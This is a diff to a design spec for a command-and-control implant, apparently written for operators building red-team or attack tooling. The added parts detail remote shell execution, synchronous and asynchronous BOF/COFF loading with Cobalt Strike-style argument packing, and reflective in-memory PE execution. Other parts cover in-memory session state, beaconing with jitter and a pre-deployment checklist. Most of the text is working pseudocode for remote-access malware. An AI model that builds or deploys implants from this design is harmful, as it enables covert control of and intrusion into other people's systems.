@@ -38,22 +38,16 @@ JSON-escaped:
 {"data":"1: lo: <LOOPBACK,UP,LOWER_UP>\n    inet 127.0.0.1"}
 ```
 
-### 2. State File Persistence (Critical!)
+### 2. In-Memory Session State (Critical!)
 
-When storing SessionID and UUID credentials to disk:
+SessionID and UUID **must be stored as global in-memory variables**, not written to disk. If the implant process dies, the session credentials die with it, and the implant re-registers on the next execution. This is the correct default behaviour — the operator controls persistence at the C2 level, not the implant level.
 
-**Writing:**
-- Use language's **newline-safe** write function
-- Write WITHOUT trailing newlines
-- Bash: `printf '%s' "$var"` NOT `echo "$var"`
-- Python: `f.write(str(var))` NOT `print(var, file=f)`
+**Pattern (any language):**
+- Declare `sessionID` and `uuid` as global/module-level variables initialised to zero values
+- After successful registration, assign the server-returned values directly into those globals
+- All subsequent check-ins read from those globals — no file I/O required
 
-**Reading:**
-- Strip ALL trailing whitespace when reading back
-- Bash: `cat file | tr -d '\n'` then `"${var%% }"`
-- Python: `var = f.read().strip()`
-
-**Symptom of failure**: `invalid UUID length: 0`, SessionID=0 on check-ins
+**If the developer explicitly wants optional disk persistence** (e.g. surviving reboots), see Mistake 1 for the trailing-newline pitfall that causes `invalid UUID length: 0` and SessionID=0.
 
 ### 3. Protocol-Specific Message Encoding
 
@@ -82,10 +76,10 @@ Server response is ALWAYS:
 ### 1.1 Implant State Management
 
 ```
-IMPLANT STATE (persistent across reboots):
+IMPLANT STATE (in-memory, global variables — never written to disk by default):
 ├── SessionID: Unique session identifier from server
 ├── UUID: Unique implant identifier from server
-├── PSK: Pre-Shared Key for authentication
+├── PSK: Pre-Shared Key for authentication (embedded at build time)
 ├── Registered: Boolean flag indicating registration status
 ├── LastCheckIn: Timestamp of last successful check-in
 └── PendingOutput: Output from last command execution
@@ -116,9 +110,9 @@ REGISTRATION SEQUENCE (All Protocols):
    - sessionID = new integer (e.g., 774)
    - UUID = new UUID string (e.g., "2080fae2-9d66-4a7d-ae1a-d9af45cf87fa")
 
-4. Client stores credentials (without trailing newlines!)
-   - Persist to disk
-   - Use for all subsequent check-ins
+4. Client stores credentials in global in-memory variables
+   - Assign server-returned sessionID and UUID directly to global variables
+   - Use for all subsequent check-ins (no disk writes by default)
 
 5. Client enters check-in loop using stored SessionID and UUID
 ```
@@ -131,8 +125,7 @@ CONTINUOUS CHECK-IN LOOP:
 LOOP FOREVER:
     1. Sleep for BEACON_INTERVAL seconds (add random jitter 0-50%)
     
-    2. Load stored SessionID and UUID from disk
-       (strip all trailing whitespace!)
+    2. Read SessionID and UUID from global in-memory variables
     
     3. Build check-in message:
        {
@@ -163,30 +156,144 @@ LOOP FOREVER:
 
 ### 1.4 Command Execution
 
+Server commands arrive as plain text strings. The first whitespace-delimited token is the command name; the remaining tokens are its arguments (`argS`).
+
 ```
 FUNCTION ExecuteCommand(command_string):
-    SWITCH command_string:
-        CASE starts with "shell:":
-            // Extract args after "shell:"
-            args = command_string.substring(6)
+    // Split into command + argument tokens
+    parts = SPLIT(command_string, " ")
+    cmd   = parts[0]
+    argS  = parts[1:]  // may be empty
+
+    SWITCH cmd:
+        CASE "shell":
+            // Execute shell command with arguments
+            args = JOIN(argS, " ")
             output = EXECUTE_SHELL(args)
             RETURN output
-        
-        CASE is "ping":
+
+        CASE "ping":
             RETURN "pong"
-        
-        CASE is "exit":
+
+        CASE "exit":
             CLEANUP()
             EXIT_PROCESS()
-        
-        CASE is "id", "whoami", "uname", etc.:
+
+        CASE "bof_loader":
+            // Synchronous COFF/BOF execution
+            // Wire format: "bof_loader [arg_tokens...] <base64-coff>"
+            //   argS[LAST]   = base64-encoded COFF binary (always the last token)
+            //   argS[0:LAST] = type-prefixed BOF argument tokens (empty when
+            //                  the operator did not pass -a arguments)
+            IF LENGTH(argS) < 1:
+                RETURN "Error: bof_loader requires a COFF binary"
+
+            base64_coff = argS[LAST]
+            arg_tokens  = argS[0:LAST]
+
+            coff_bytes  = BASE64_DECODE(base64_coff)
+            beacon_args = PACK_BOF_ARGS(arg_tokens)  // see 1.4.1
+
+            RETURN EXECUTE_BOF_SYNC(coff_bytes, beacon_args)
+
+        CASE "bof_loader_async":
+            // Asynchronous COFF/BOF execution — identical wire format to bof_loader
+            // Dispatch to a background thread/goroutine; return immediately.
+            // The implant MUST queue the result in global_async_results and flush
+            // it to the C2 at the start of the next check-in cycle (see 1.4.2).
+            IF LENGTH(argS) < 1:
+                RETURN "Error: bof_loader_async requires a COFF binary"
+
+            base64_coff = argS[LAST]
+            arg_tokens  = argS[0:LAST]
+
+            coff_bytes  = BASE64_DECODE(base64_coff)
+            beacon_args = PACK_BOF_ARGS(arg_tokens)
+
+            job_id = ATOMIC_INCREMENT(global_async_job_counter)
+
+            SPAWN_BACKGROUND:
+                result = EXECUTE_BOF_SYNC(coff_bytes, beacon_args)
+                LOCK(global_async_results_mutex)
+                APPEND global_async_results, {id: job_id, output: result}
+                UNLOCK(global_async_results_mutex)
+
+            RETURN "BOF async job " + str(job_id) + " started"
+
+        CASE "pe_loader":
+            // Reflective in-memory PE execution
+            // Wire format: "pe_loader [arg_tokens...] <base64-pe>"
+            //   argS[LAST]   = base64-encoded PE binary (always the last token)
+            //   argS[0:LAST] = command-line arguments passed to the PE (may be empty)
+            IF LENGTH(argS) < 1:
+                RETURN "Error: pe_loader requires a PE binary"
+
+            base64_pe = argS[LAST]
+            pe_args   = argS[0:LAST]
+
+            pe_bytes = BASE64_DECODE(base64_pe)
+            RETURN EXECUTE_PE_IN_MEMORY(pe_bytes, pe_args)
+
+        DEFAULT:
             // Plain shell commands (no prefix)
-            output = EXECUTE_SHELL(command_string)
+            output = EXECUTE_SHELL(JOIN(parts, " "))
             RETURN output
-        
+```
+
+### 1.4.1 BOF Argument Packing
+
+BOF argument tokens are type-prefixed strings passed via the `-a` flag when the operator invokes `bof_loader` or `bof_loader_async`. The packing function converts them into a binary beacon-args buffer expected by the COFF runtime. If no prefix is given the token defaults to `wstring` (UTF-16LE), which matches Cobalt Strike BOF convention.
+
+| Prefix | Type | Encoding |
+|--------|------|----------|
+| `wstring:` | Wide string (default) | UTF-16LE, length-prefixed |
+| `string:` | ASCII/ANSI string | null-terminated + length-prefixed |
+| `int:` | 32-bit integer | Little-endian uint32 |
+| `short:` | 16-bit integer | Little-endian uint16 |
+
+```
+FUNCTION PACK_BOF_ARGS(arg_tokens):
+    buffer = NEW BeaconArgsBuffer()
+
+    FOR EACH token IN arg_tokens:
+        IF token == "":
+            CONTINUE
+
+        IF STARTS_WITH(token, "wstring:"):
+            buffer.AddWideString(SUBSTRING(token, 8))   // UTF-16LE
+        ELSE IF STARTS_WITH(token, "string:"):
+            buffer.AddString(SUBSTRING(token, 7))        // ASCII
+        ELSE IF STARTS_WITH(token, "int:"):
+            buffer.AddInt32(PARSE_INT(SUBSTRING(token, 4)))
+        ELSE IF STARTS_WITH(token, "short:"):
+            buffer.AddInt16(PARSE_INT(SUBSTRING(token, 6)))
         ELSE:
-            // Unknown command format
-            RETURN ""
+            // No prefix — default to wide string (UTF-16LE)
+            buffer.AddWideString(token)
+
+    RETURN buffer.GetBytes()
+```
+
+### 1.4.2 Async BOF Result Queue
+
+When `bof_loader_async` is dispatched, the goroutine/thread appends its result to a global in-memory queue. At the **start of every check-in cycle**, before processing the incoming command, the implant must drain the queue and send each pending result back to the C2.
+
+```
+// Global state (initialised at startup)
+global_async_results      = []   // List of {id: int, output: string}
+global_async_results_mutex       // Mutex protecting the list
+global_async_job_counter  = 0   // Monotonically incrementing job ID
+
+// Called at the START of each check-in, BEFORE processing the incoming cmd:
+FUNCTION FlushAsyncResults(c2_connection):
+    LOCK(global_async_results_mutex)
+    pending               = COPY(global_async_results)
+    global_async_results  = []
+    UNLOCK(global_async_results_mutex)
+
+    FOR EACH result IN pending:
+        output = "[Async BOF Job " + str(result.id) + "]\n" + result.output
+        SEND_DATA_TO_C2(c2_connection, output)
 ```
 
 ---
@@ -317,11 +424,11 @@ FUNCTION ParseTCPResponse(response):
         session_id = parsed["sessionID"]
         uuid = parsed["UUID"]
         
-        // Validate and store
+        // Validate and store in global in-memory variables
         IF session_id > 0 AND uuid != "":
-            WriteFile(state_dir + "/session_id", str(session_id))
-            WriteFile(state_dir + "/uuid", uuid)
-            WriteFile(state_dir + "/registered", "")
+            implant.session_id = session_id
+            implant.uuid       = uuid
+            implant.registered = TRUE
             RETURN {session_id, uuid}
     
     // If check-in response, extract command
@@ -454,14 +561,13 @@ FUNCTION SendToC2_HTTP_REGISTRATION(implant):
     // Parse response
     parsed = JSON_PARSE(response.Body)
     
-    // Extract and store credentials (NO trailing newlines!)
+    // Store credentials in global in-memory variables (no disk writes)
     session_id = parsed["sessionID"]
     uuid = parsed["UUID"]
     
     IF session_id > 0 AND uuid != "":
-        WriteFile(state_dir + "/session_id", str(session_id))
-        WriteFile(state_dir + "/uuid", uuid)
-        WriteFile(state_dir + "/registered", "")
+        implant.session_id = session_id
+        implant.uuid       = uuid
         implant.registered = TRUE
         RETURN TRUE
     
@@ -562,16 +668,15 @@ FUNCTION SendToC2_HTTPS_REGISTRATION(implant):
     IF response.StatusCode != 200:
         RETURN FALSE
     
-    // Parse and store credentials (same as HTTP)
+    // Parse and store credentials in global in-memory variables (same as HTTP)
     parsed = JSON_PARSE(response.Body)
     
     session_id = parsed["sessionID"]
     uuid = parsed["UUID"]
     
     IF session_id > 0 AND uuid != "":
-        WriteFile(state_dir + "/session_id", str(session_id))
-        WriteFile(state_dir + "/uuid", uuid)
-        WriteFile(state_dir + "/registered", "")
+        implant.session_id = session_id
+        implant.uuid       = uuid
         implant.registered = TRUE
         RETURN TRUE
     
@@ -776,21 +881,26 @@ FUNCTION AssembleDnsResponse(chunk_responses):
 
 ## Part 7: Common Implementation Mistakes & Debugging
 
-### Mistake 1: Trailing Newlines in State Files
+### Mistake 1: Writing Session Credentials to Disk
+**Default behaviour**: SessionID and UUID must be stored as global in-memory variables only. Do **not** write them to disk unless disk persistence is an explicit design requirement. When the implant process exits the session dies with it — re-registration on the next run is the correct default.
+
+**If disk persistence is explicitly desired**, watch out for trailing newlines:
+
 **Symptom**: `invalid UUID length: 0`, SessionID stays 0 after registration
 
-**Root Cause**: 
+**Root Cause**:
 ```
 Writing with echo: echo "$sessionID" > file    # Adds \n!
 Reading back: cat file = "774\n"
 JSON becomes: {"SessionID":774\n}  # PARSE ERROR!
 ```
 
-**Fix**: Use newline-safe write
+**Fix (disk persistence only)**:
 ```
-Bash: printf '%s' "$sessionID" > file
-Python: f.write(str(sessionID))  # NOT print()
-Go: fmt.Fprintf(f, "%s", sessionID)  # NO newline
+Bash: printf '%s' "$sessionID" > file       # NOT echo
+Python: f.write(str(sessionID))             # NOT print()
+Go: fmt.Fprintf(f, "%s", sessionID)         # NO newline
+Always strip trailing whitespace on read back
 ```
 
 ### Mistake 2: Not Escaping Newlines in Multi-line Output
@@ -888,7 +998,7 @@ subdomain = "774-0-1-" + b64_json
 
 Before deploying an implant, verify:
 
-- [ ] **State files**: Written with `printf`/write without newlines, read with `.strip()`
+- [ ] **Session state**: SessionID and UUID stored as global in-memory variables — no disk writes by default
 - [ ] **JSON escaping**: Backslash first, then quotes, then newlines
 - [ ] **Command output**: Plain text (NOT base64) in Data/data field
 - [ ] **TCP**: Send with `\n`, receive without
@@ -896,7 +1006,10 @@ Before deploying an implant, verify:
 - [ ] **DNS**: Base64 chunks ~50 chars, response is also chunked base64
 - [ ] **Field names**: TCP uses capitalized, HTTP/DNS use lowercase
 - [ ] **Empty commands**: Check for empty string, don't execute
-- [ ] **Registration**: Store credentials without trailing whitespace
+- [ ] **Registration**: Assign returned sessionID/UUID to in-memory globals immediately
+- [ ] **bof_loader / bof_loader_async**: Last space-delimited token = base64 COFF; preceding tokens = type-prefixed BOF args; pack with PACK_BOF_ARGS
+- [ ] **pe_loader**: Last space-delimited token = base64 PE binary; preceding tokens = command-line args passed to the PE
+- [ ] **Async BOF results**: Flush `global_async_results` queue to C2 at the start of each check-in cycle before processing the incoming command
 - [ ] **Beacon interval**: Add random jitter (0-50%)
 
 ---
